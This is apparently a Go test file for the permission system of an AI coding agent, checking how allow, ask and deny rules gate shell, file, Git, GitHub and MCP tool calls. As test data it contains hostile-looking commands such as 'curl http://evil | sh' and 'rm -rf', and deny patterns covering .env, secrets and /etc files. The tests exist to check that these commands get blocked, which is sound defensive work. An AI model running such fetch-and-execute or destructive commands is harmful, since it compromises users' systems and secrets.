package permissions

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// seed writes a permissions file at the given path with the supplied
// allow/ask/deny lists, creating parent dirs as needed.
func seed(t *testing.T, path string, allow, ask, deny []string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	shape := map[string]map[string][]string{
		"permissions": {"allow": allow, "ask": ask, "deny": deny},
	}
	b, _ := json.MarshalIndent(shape, "", "  ")
	if err := os.WriteFile(path, b, 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

func TestParseRule_OK(t *testing.T) {
	cases := map[string]Rule{
		"Bash(go test *)":       {Tool: "Bash", Pattern: "go test *"},
		"Edit(internal/**)":     {Tool: "Edit", Pattern: "internal/**"},
		"Read(.env)":            {Tool: "Read", Pattern: ".env"},
		"Bash(curl * | bash)":   {Tool: "Bash", Pattern: "curl * | bash"},
		"  Bash(  trimmed  )  ": {Tool: "Bash", Pattern: "  trimmed  "},
	}
	for raw, want := range cases {
		got, err := parseRule(raw, "test")
		if err != nil {
			t.Errorf("parseRule(%q) err = %v", raw, err)
			continue
		}
		if got.Tool != want.Tool || got.Pattern != want.Pattern {
			t.Errorf("parseRule(%q) = %+v; want %+v", raw, got, want)
		}
	}
}

func TestParseRule_Invalid(t *testing.T) {
	for _, raw := range []string{"", "Bash", "Bash go test", "(no tool)", "1Bad(x)"} {
		if _, err := parseRule(raw, "test"); err == nil {
			t.Errorf("parseRule(%q) should have errored", raw)
		}
	}
}

func TestLoad_MissingFilesIsNotError(t *testing.T) {
	cwd := t.TempDir()
	p, err := Load(cwd)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if d, a, k := p.Snapshot(); len(d)+len(a)+len(k) != 0 {
		t.Errorf("expected empty rule set; got deny=%v allow=%v ask=%v", d, a, k)
	}
}

func TestLoad_MergesSharedAndLocal(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Bash(go test *)"}, nil, []string{"Bash(rm *)"})
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.local.json"),
		[]string{"Edit(internal/**)"}, []string{"Read(.env)"}, nil)

	p, err := Load(cwd)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	deny, allow, ask := p.Snapshot()
	if len(deny) != 1 || deny[0].Pattern != "rm *" {
		t.Errorf("deny merge wrong: %v", deny)
	}
	if len(allow) != 2 {
		t.Errorf("allow merge wrong: %v", allow)
	}
	if len(ask) != 1 || ask[0].Tool != "Read" {
		t.Errorf("ask merge wrong: %v", ask)
	}
}

// TestLoad_EmptyFileIsNotError pins the regression: openInVim creates
// permissions.json as 0 bytes when the user first opens the picker row,
// so the next startup was crashing on json.Unmarshal of an empty byte
// slice. Empty / whitespace-only files now behave like a missing file.
func TestLoad_EmptyFileIsNotError(t *testing.T) {
	cwd := t.TempDir()
	for _, body := range []string{"", "   ", "\n\n\t\n"} {
		path := filepath.Join(cwd, ".yottacode", "permissions.json")
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatalf("mkdir: %v", err)
		}
		if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
			t.Fatalf("write: %v", err)
		}
		p, err := Load(cwd)
		if err != nil {
			t.Fatalf("Load(empty=%q): %v", body, err)
		}
		if d, a, k := p.Snapshot(); len(d)+len(a)+len(k) != 0 {
			t.Errorf("empty file should yield no rules; got deny=%v allow=%v ask=%v", d, a, k)
		}
	}
}

// TestLoad_PartialPermissionsShape locks in the contract for files that
// declare only one of allow/ask/deny — the case described in the bug
// report ({"permissions":{"allow":["Bash(go *)"]}} with no ask/deny).
func TestLoad_PartialPermissionsShape(t *testing.T) {
	cwd := t.TempDir()
	path := filepath.Join(cwd, ".yottacode", "permissions.local.json")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(`{"permissions":{"allow":["Bash(go *)"]}}`), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	p, err := Load(cwd)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	_, allow, _ := p.Snapshot()
	if len(allow) != 1 || allow[0].Pattern != "go *" {
		t.Errorf("partial shape should still parse allow list; got %v", allow)
	}
}

func TestLoad_MalformedFileErrors(t *testing.T) {
	cwd := t.TempDir()
	path := filepath.Join(cwd, ".yottacode", "permissions.json")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(`{"permissions": {"allow": ["BrokenRule"]}}`), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	if _, err := Load(cwd); err == nil {
		t.Errorf("Load should surface invalid rule")
	}
}

func TestEvaluate_MCPToolAllowByServer(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"MCP(filesystem/*)"}, nil, nil)
	p, _ := Load(cwd)
	if got := p.Evaluate("mcp/filesystem/read_file", `{"path":"/x"}`); got != Allow {
		t.Errorf("MCP(filesystem/*) should match mcp/filesystem/read_file; got %v", got)
	}
	if got := p.Evaluate("mcp/github/create_pull_request", `{}`); got != Default {
		t.Errorf("MCP(filesystem/*) should NOT match mcp/github/*; got %v", got)
	}
}

func TestEvaluate_MCPToolAllowExact(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"MCP(filesystem/read_file)"}, nil, nil)
	p, _ := Load(cwd)
	if got := p.Evaluate("mcp/filesystem/read_file", `{}`); got != Allow {
		t.Errorf("exact MCP rule should Allow; got %v", got)
	}
	if got := p.Evaluate("mcp/filesystem/write_file", `{}`); got != Default {
		t.Errorf("exact MCP rule should NOT match write_file; got %v", got)
	}
}

func TestEvaluate_MCPToolDenyBeatsAllow(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"MCP(*)"}, nil, []string{"MCP(github/delete_repository)"})
	p, _ := Load(cwd)
	if got := p.Evaluate("mcp/github/delete_repository", `{}`); got != Deny {
		t.Errorf("specific MCP deny should win over wildcard allow; got %v", got)
	}
	if got := p.Evaluate("mcp/github/create_issue", `{}`); got != Allow {
		t.Errorf("MCP(*) wildcard should allow create_issue; got %v", got)
	}
}

func TestEvaluate_DenyBeatsAllow(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Bash(*)"}, nil, []string{"Bash(rm *)"})
	p, _ := Load(cwd)
	if got := p.Evaluate("run_bash", `{"command":"rm -rf x"}`); got != Deny {
		t.Errorf("rm * should resolve to Deny; got %v", got)
	}
	if got := p.Evaluate("run_bash", `{"command":"go test ./..."}`); got != Allow {
		t.Errorf("go test should resolve to Allow via Bash(*); got %v", got)
	}
}

func TestEvaluate_AskOverridesDefault(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		nil, []string{"Read(.env)"}, nil)
	p, _ := Load(cwd)
	if got := p.Evaluate("read_file", `{"path":".env"}`); got != Ask {
		t.Errorf("Read(.env) should resolve to Ask; got %v", got)
	}
	if got := p.Evaluate("read_file", `{"path":"main.go"}`); got != Default {
		t.Errorf("non-matching read should be Default; got %v", got)
	}
}

func TestEvaluate_NormalizedArgsStillHitDenyRules(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"), nil, nil, []string{
		"Read(secrets/**)",
		"Git(commit *)",
		"Fetch(https://example.com/private/*)",
	})
	p, _ := Load(cwd)

	cases := []struct {
		name string
		tool string
		args string
	}{
		{"read_file boundary whitespace", "read_file", `{"path":" secrets/key.txt\n"}`},
		{"read_many_files single string", "read_many_files", `{"paths":"secrets/key.txt"}`},
		{"read_many_files boundary whitespace", "read_many_files", `{"paths":[" secrets/key.txt\n"]}`},
		{"git string args", "git", `{"args":"git commit -m \"x\""}`},
		{"fetch normalized url", "fetch_url", `{"url":" HTTPS://example.com/private/a\n"}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := p.Evaluate(c.tool, c.args); got != Deny {
				t.Fatalf("Evaluate(%s, %s) = %v, want Deny", c.tool, c.args, got)
			}
		})
	}
}

func TestEvaluate_PathPatternsUseDoublestar(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Edit(internal/**)"}, nil, nil)
	p, _ := Load(cwd)
	got := p.Evaluate("edit_file", `{"path":"internal/agent/loop.go"}`)
	if got != Allow {
		t.Errorf("Edit(internal/**) should match internal/agent/loop.go; got %v", got)
	}
	got = p.Evaluate("edit_file", `{"path":"cmd/main.go"}`)
	if got != Default {
		t.Errorf("Edit(internal/**) should NOT match cmd/main.go; got %v", got)
	}
}

func TestEvaluate_AbsolutePathRule(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		nil, nil, []string{"Edit(/etc/**)"})
	p, _ := Load(cwd)
	got := p.Evaluate("edit_file", `{"path":"/etc/hosts"}`)
	if got != Deny {
		t.Errorf("Edit(/etc/**) should match /etc/hosts; got %v", got)
	}
}

func TestEvaluate_GithubRuleMatchesByVerb(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Github(read_pr)"}, nil, nil)
	p, _ := Load(cwd)
	if got := p.Evaluate("gh_pr_read", `{"ref":"29"}`); got != Allow {
		t.Errorf("Github(read_pr) should match gh_pr_read; got %v", got)
	}
	if got := p.Evaluate("gh_pr_create", `{"base":"main","title":"t","body":"b"}`); got != Default {
		t.Errorf("Github(read_pr) should NOT match gh_pr_create; got %v", got)
	}
}

func TestEvaluate_GithubReadWildcard(t *testing.T) {
	// Github(read_*) is the roadmap's canonical "all reads" rule.
	// Must match every read verb but never a write verb.
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Github(read_*)"}, nil, nil)
	p, _ := Load(cwd)
	for _, tool := range []string{"gh_pr_read", "gh_pr_review_context", "gh_issue_read"} {
		if got := p.Evaluate(tool, `{}`); got != Allow {
			t.Errorf("Github(read_*) should match %s; got %v", tool, got)
		}
	}
	for _, tool := range []string{"gh_pr_create", "gh_pr_update", "gh_pr_add_comment"} {
		if got := p.Evaluate(tool, `{"base":"main","title":"t","body":"b"}`); got != Default {
			t.Errorf("Github(read_*) should NOT match %s; got %v", tool, got)
		}
	}
}

func TestEvaluate_GithubCatchAllWildcard(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Github(*)"}, nil, nil)
	p, _ := Load(cwd)
	for _, tool := range []string{"gh_pr_read", "gh_pr_create", "gh_pr_update", "gh_pr_add_comment", "gh_issue_read", "gh_issue_list", "gh_issue_create", "gh_pr_review_context"} {
		got := p.Evaluate(tool, `{}`)
		if got != Allow {
			t.Errorf("Github(*) should match %s; got %v", tool, got)
		}
	}
}

// Regression: gh_issue_create shipped with docs advertising
// Github(create_issue) rules but no targetFor mapping, so the tool fell
// through to Target{} and allow/ask/deny rules — including a Deny under
// --yolo, the one gate yolo still honors — never bound to it.
func TestEvaluate_GithubCreateIssueRulesBind(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Github(*)"}, nil, []string{"Github(create_issue)"})
	p, _ := Load(cwd)
	if got := p.Evaluate("gh_issue_create", `{"title":"t"}`); got != Deny {
		t.Errorf("Github(create_issue) deny must bind to gh_issue_create; got %v", got)
	}
	if got := p.Evaluate("gh_issue_list", `{}`); got != Allow {
		t.Errorf("sibling read verb should still allow; got %v", got)
	}
}

func TestEvaluate_GithubDenyOverridesAllow(t *testing.T) {
	// Same precedence as Bash — Deny beats Allow regardless of
	// rule order. Pin so future precedence refactors don't break
	// the safety guarantee for write verbs.
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Github(*)"}, nil, []string{"Github(add_pr_comment)"})
	p, _ := Load(cwd)
	if got := p.Evaluate("gh_pr_add_comment", `{"ref":"29","body":"x"}`); got != Deny {
		t.Errorf("Deny should beat Allow for add_pr_comment; got %v", got)
	}
	if got := p.Evaluate("gh_pr_read", `{}`); got != Allow {
		t.Errorf("non-denied verb should still allow; got %v", got)
	}
}

func TestEvaluate_GithubAskForWrites(t *testing.T) {
	// Common per-write pattern: silently allow reads, force a
	// prompt on writes even though the tool itself already
	// requires approval. Pin this works.
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Github(read_*)"}, []string{"Github(create_pr)", "Github(update_pr)", "Github(add_pr_comment)"}, nil)
	p, _ := Load(cwd)
	if got := p.Evaluate("gh_pr_create", `{"base":"main","title":"t","body":"b"}`); got != Ask {
		t.Errorf("Github ask rule should force Ask on create_pr; got %v", got)
	}
}

// TestTargetFor_MemoryToolsAllGated pins that every memory tool — the
// four agent-managed ones AND session_recall — resolves to the Memory
// permission namespace, so a deny:["Memory(*)"] rule blocks them all.
// session_recall was the gap: it had no targetFor case, so it fell to
// Default and ran unconditionally despite the docs promising coverage.
func TestTargetFor_MemoryToolsAllGated(t *testing.T) {
	for _, tool := range []string{"memory_save", "memory_forget", "memory_search", "memory_get", "memory_archive_prune", "session_recall"} {
		t.Run(tool, func(t *testing.T) {
			got := targetFor(tool, `{"scope":"user","name":"x","query":"q"}`, "")
			if got.PermName != "Memory" {
				t.Errorf("targetFor(%q).PermName = %q; want Memory (deny:[Memory(*)] must gate it)", tool, got.PermName)
			}
		})
	}
}

func TestTargetFor_GithubVerbMapping(t *testing.T) {
	// Pin the tool-name → verb mapping so a future rename of
	// a tool surface that drops the gh_pr_read → read_pr mapping
	// breaks visibly here instead of silently turning an Allow
	// into a Default.
	cases := []struct {
		toolName string
		wantVerb string
	}{
		{"gh_pr_create", "create_pr"},
		{"gh_pr_update", "update_pr"},
		{"gh_pr_read", "read_pr"},
		{"gh_pr_review_context", "read_pr_review_context"},
		{"gh_pr_add_comment", "add_pr_comment"},
		{"gh_issue_read", "read_issue"},
		{"gh_issue_list", "list_open_issues"},
		{"gh_issue_create", "create_issue"},
	}
	for _, tc := range cases {
		t.Run(tc.toolName, func(t *testing.T) {
			got := targetFor(tc.toolName, "{}", "")
			if got.PermName != "Github" {
				t.Errorf("PermName = %q; want Github", got.PermName)
			}
			if got.Descriptor != tc.wantVerb {
				t.Errorf("Descriptor = %q; want %q", got.Descriptor, tc.wantVerb)
			}
		})
	}
}

func TestEvaluate_BashGlobMatchesSpacesAndArgs(t *testing.T) {
	cwd := t.TempDir()
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Bash(go *)"}, nil, nil)
	p, _ := Load(cwd)
	if got := p.Evaluate("run_bash", `{"command":"go test ./internal/..."}`); got != Allow {
		t.Errorf("Bash(go *) should match go test ./internal/...; got %v", got)
	}
	if got := p.Evaluate("run_bash", `{"command":"npm install"}`); got != Default {
		t.Errorf("Bash(go *) should NOT match npm install; got %v", got)
	}
}

func TestEvaluate_NilPermissionsIsDefault(t *testing.T) {
	var p *Permissions
	if got := p.Evaluate("run_bash", `{"command":"x"}`); got != Default {
		t.Errorf("nil Permissions should evaluate to Default; got %v", got)
	}
}

func TestAddAllow_PersistsToLocalFile(t *testing.T) {
	cwd := t.TempDir()
	p, _ := Load(cwd)
	if err := p.AddAllow("Bash(go *)"); err != nil {
		t.Fatalf("AddAllow: %v", err)
	}
	b, err := os.ReadFile(filepath.Join(cwd, ".yottacode", "permissions.local.json"))
	if err != nil {
		t.Fatalf("local file not written: %v", err)
	}
	if !strings.Contains(string(b), "Bash(go *)") {
		t.Errorf("local file missing rule: %s", b)
	}
}

func TestAddAllow_IsIdempotent(t *testing.T) {
	cwd := t.TempDir()
	p, _ := Load(cwd)
	if err := p.AddAllow("Bash(go *)"); err != nil {
		t.Fatalf("AddAllow first: %v", err)
	}
	if err := p.AddAllow("Bash(go *)"); err != nil {
		t.Fatalf("AddAllow second: %v", err)
	}
	_, allow, _ := p.Snapshot()
	if len(allow) != 1 {
		t.Errorf("AddAllow should dedup; got %d entries", len(allow))
	}
}

func TestReload_PicksUpExternalEdits(t *testing.T) {
	cwd := t.TempDir()
	p, _ := Load(cwd)
	// User edits the file out-of-band.
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.json"),
		[]string{"Bash(echo *)"}, nil, nil)
	if got := p.Evaluate("run_bash", `{"command":"echo hi"}`); got != Default {
		t.Fatalf("pre-Reload should still be Default")
	}
	if err := p.Reload(); err != nil {
		t.Fatalf("Reload: %v", err)
	}
	if got := p.Evaluate("run_bash", `{"command":"echo hi"}`); got != Allow {
		t.Errorf("post-Reload should be Allow; got %v", got)
	}
}

func TestDeriveAllowRule(t *testing.T) {
	cwd := t.TempDir()
	// Path-typed tools all derive a cwd-anchored absolute glob, so the
	// "want" templates substitute <CWD> for the actual temp dir.
	cwdSlash := filepath.ToSlash(cwd)
	cases := []struct {
		name     string
		tool     string
		args     string
		wantOK   bool
		wantRule string
	}{
		{"bash simple", "run_bash", `{"command":"go test ./..."}`, true, "Bash(go *)"},
		{"bash compound", "run_bash", `{"command":"cd /tmp && rm -rf x"}`, false, ""},
		{"bash dangerous", "run_bash", `{"command":"rm -rf x"}`, false, ""},
		{"bash sudo", "run_bash", `{"command":"sudo apt update"}`, false, ""},
		{"edit nested", "edit_file", `{"path":"internal/foo.go"}`, true, "Edit(" + cwdSlash + "/**)"},
		{"edit deep", "edit_file", `{"path":"internal/agent/x.go"}`, true, "Edit(" + cwdSlash + "/**)"},
		{"write top-level", "write_file", `{"path":"new.txt"}`, true, "Write(" + cwdSlash + "/**)"},
		{"delete top-level", "delete_file", `{"path":"hello.txt"}`, true, "Delete(" + cwdSlash + "/**)"},
		{"list cwd", "list_dir", `{"path":"."}`, true, "List(" + cwdSlash + "/**)"},
		{"move within cwd", "move_file", `{"src":"a/b.go","dst":"c/d.go"}`, true, "Move(" + cwdSlash + "/** -> " + cwdSlash + "/**)"},
		{"copy top-level", "copy_file", `{"src":"a.txt","dst":"b.txt"}`, true, "Copy(" + cwdSlash + "/** -> " + cwdSlash + "/**)"},
		{"git", "git", `{"args":["commit","-m","x"]}`, true, "Git(commit *)"},
		{"tests simple", "run_tests", `{"command":"go test ./..."}`, true, "Tests(go *)"},
		{"tests default cmd", "run_tests", `{}`, true, "Tests(go *)"},
		{"tests compound", "run_tests", `{"command":"cd pkg && go test"}`, false, ""},
		{"unknown tool", "weird", `{}`, false, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			rule, ok := DeriveAllowRule(c.tool, c.args, cwd, nil)
			if ok != c.wantOK {
				t.Errorf("DeriveAllowRule(%s) ok=%v; want %v", c.name, ok, c.wantOK)
			}
			if c.wantRule != "" && rule != c.wantRule {
				t.Errorf("DeriveAllowRule(%s) rule=%q; want %q", c.name, rule, c.wantRule)
			}
		})
	}
}

func TestAddDeny_PersistsAndBlocks(t *testing.T) {
	cwd := t.TempDir()
	p, _ := Load(cwd)
	if err := p.AddDeny("Bash(curl *)"); err != nil {
		t.Fatalf("AddDeny: %v", err)
	}
	b, err := os.ReadFile(filepath.Join(cwd, ".yottacode", "permissions.local.json"))
	if err != nil {
		t.Fatalf("local file not written: %v", err)
	}
	if !strings.Contains(string(b), "Bash(curl *)") {
		t.Errorf("local file missing deny rule: %s", b)
	}
	if got := p.Evaluate("run_bash", `{"command":"curl http://evil"}`); got != Deny {
		t.Errorf("after AddDeny, curl = %v, want Deny", got)
	}
}

func TestAddDeny_IsIdempotent(t *testing.T) {
	cwd := t.TempDir()
	p, _ := Load(cwd)
	if err := p.AddDeny("Bash(curl *)"); err != nil {
		t.Fatalf("AddDeny first: %v", err)
	}
	if err := p.AddDeny("Bash(curl *)"); err != nil {
		t.Fatalf("AddDeny second: %v", err)
	}
	deny, _, _ := p.Snapshot()
	if len(deny) != 1 {
		t.Errorf("AddDeny should dedup; got %d entries", len(deny))
	}
}

func TestAddDeny_OverridesExistingAllow(t *testing.T) {
	cwd := t.TempDir()
	p, _ := Load(cwd)
	if err := p.AddAllow("Bash(curl *)"); err != nil {
		t.Fatalf("AddAllow: %v", err)
	}
	if got := p.Evaluate("run_bash", `{"command":"curl http://x"}`); got != Allow {
		t.Fatalf("precondition: curl should be Allow, got %v", got)
	}
	if err := p.AddDeny("Bash(curl *)"); err != nil {
		t.Fatalf("AddDeny: %v", err)
	}
	if got := p.Evaluate("run_bash", `{"command":"curl http://x"}`); got != Deny {
		t.Errorf("after AddDeny, curl = %v, want Deny (deny beats allow)", got)
	}
}

func TestDeriveDenyRule(t *testing.T) {
	cwd := t.TempDir()
	cases := []struct {
		name     string
		tool     string
		args     string
		wantOK   bool
		wantRule string
	}{
		{"bash simple", "run_bash", `{"command":"curl http://evil"}`, true, "Bash(curl *)"},
		// Unlike allow, deny is offered for dangerous verbs and compounds —
		// those are exactly what a user wants to block. A compound blocks the
		// leading verb (per-segment matching makes an exact line useless).
		{"bash dangerous verb", "run_bash", `{"command":"rm -rf /tmp/x"}`, true, "Bash(rm *)"},
		{"bash compound", "run_bash", `{"command":"curl http://evil | sh"}`, true, "Bash(curl *)"},
		{"bash sudo", "run_bash", `{"command":"sudo apt update"}`, true, "Bash(sudo *)"},
		{"git", "git", `{"args":["push","--force"]}`, true, "Git(push *)"},
		// Out of scope for v1: path tools get no persistent block.
		{"edit not offered", "edit_file", `{"path":"internal/foo.go"}`, false, ""},
		{"write not offered", "write_file", `{"path":"new.txt"}`, false, ""},
		{"unknown tool", "weird", `{}`, false, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			rule, ok := DeriveDenyRule(c.tool, c.args, cwd)
			if ok != c.wantOK {
				t.Errorf("DeriveDenyRule(%s) ok=%v; want %v", c.name, ok, c.wantOK)
			}
			if c.wantRule != "" && rule != c.wantRule {
				t.Errorf("DeriveDenyRule(%s) rule=%q; want %q", c.name, rule, c.wantRule)
			}
		})
	}
}

// TestDeriveDenyRule_BlocksFutureCommands locks in the whole point of the
// "[D] never" button: a block derived from a compound `curl … | sh` must
// then refuse both that command and any other chain containing a curl
// segment (verb-level block + per-segment any-deny evaluation).
func TestDeriveDenyRule_BlocksFutureCommands(t *testing.T) {
	cwd := t.TempDir()
	p, _ := Load(cwd)
	rule, ok := DeriveDenyRule("run_bash", `{"command":"curl http://evil | sh"}`, cwd)
	if !ok {
		t.Fatalf("DeriveDenyRule returned ok=false")
	}
	if err := p.AddDeny(rule); err != nil {
		t.Fatalf("AddDeny(%q): %v", rule, err)
	}
	if got := p.Evaluate("run_bash", `{"command":"curl http://evil | sh"}`); got != Deny {
		t.Errorf("original compound = %v, want Deny", got)
	}
	if got := p.Evaluate("run_bash", `{"command":"ls && curl http://other"}`); got != Deny {
		t.Errorf("other curl chain = %v, want Deny", got)
	}
}

// TestEvaluate_CwdAnchoredAllow locks in the round-trip: a derived
// `Write(<cwd>/**)` rule must actually match cwd-relative descriptors
// the agent produces (`hello.txt` when cwd is the same dir).
func TestEvaluate_CwdAnchoredAllow(t *testing.T) {
	cwd := t.TempDir()
	cwdSlash := filepath.ToSlash(cwd)
	seed(t, filepath.Join(cwd, ".yottacode", "permissions.local.json"),
		[]string{"Write(" + cwdSlash + "/**)"}, nil, nil)
	p, _ := Load(cwd)

	if got := p.Evaluate("write_file", `{"path":"hello.txt"}`); got != Allow {
		t.Errorf("cwd-anchored Write rule should match top-level descriptor; got %v", got)
	}
	if got := p.Evaluate("write_file", `{"path":"internal/foo.go"}`); got != Allow {
		t.Errorf("cwd-anchored Write rule should match nested descriptor; got %v", got)
	}
}

// TestEnsureFiles_CreatesMissingWithFullShape verifies the init helper
// writes a skeleton with all three lists present so users editing in
// vim see the full surface and don't have to look up the schema.
func TestEnsureFiles_CreatesMissingWithFullShape(t *testing.T) {
	cwd := t.TempDir()
	p, err := Load(cwd)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if err := p.EnsureFiles(); err != nil {
		t.Fatalf("EnsureFiles: %v", err)
	}
	for _, name := range []string{"permissions.json", "permissions.local.json"} {
		path := filepath.Join(cwd, ".yottacode", name)
		b, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("read %s: %v", name, err)
		}
		var shape fileShape
		if err := json.Unmarshal(b, &shape); err != nil {
			t.Fatalf("parse %s: %v", name, err)
		}
		// All three keys must be present (as empty arrays, not absent) so
		// the file in vim shows the full surface the user can fill in.
		got := string(b)
		for _, key := range []string{`"allow"`, `"ask"`, `"deny"`} {
			if !strings.Contains(got, key) {
				t.Errorf("%s missing %s key:\n%s", name, key, got)
			}
		}
	}
}

func TestEnsureFiles_RewritesEmptyFile(t *testing.T) {
	cwd := t.TempDir()
	path := filepath.Join(cwd, ".yottacode", "permissions.json")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(""), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	p, _ := Load(cwd)
	if err := p.EnsureFiles(); err != nil {
		t.Fatalf("EnsureFiles: %v", err)
	}
	b, _ := os.ReadFile(path)
	if !strings.Contains(string(b), `"allow"`) || !strings.Contains(string(b), `"ask"`) || !strings.Contains(string(b), `"deny"`) {
		t.Errorf("empty file should be rewritten with full skeleton; got %q", b)
	}
}

// TestEnsureFiles_PreservesExistingContent locks in the safety property:
// once a file has real rules, EnsureFiles must never clobber it.
func TestEnsureFiles_PreservesExistingContent(t *testing.T) {
	cwd := t.TempDir()
	original := `{"permissions":{"allow":["Bash(go *)"]}}`
	path := filepath.Join(cwd, ".yottacode", "permissions.local.json")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(original), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	p, _ := Load(cwd)
	if err := p.EnsureFiles(); err != nil {
		t.Fatalf("EnsureFiles: %v", err)
	}
	b, _ := os.ReadFile(path)
	if string(b) != original {
		t.Errorf("non-empty file must be preserved; got %q want %q", b, original)
	}
}

func TestStringGlobMatch(t *testing.T) {
	cases := []struct {
		pat, val string
		want     bool
	}{
		{"*", "anything", true},
		{"go *", "go test", true},
		{"go *", "npm test", false},
		{"a?c", "abc", true},
		{"a?c", "ac", false},
		{"a*z", "abcz", true},
		{"foo bar", "foo bar", true},
		{"foo bar", "foo bar baz", false},
	}
	for _, c := range cases {
		if got := stringGlobMatch(c.pat, c.val); got != c.want {
			t.Errorf("stringGlobMatch(%q, %q) = %v; want %v", c.pat, c.val, got, c.want)
		}
	}
}
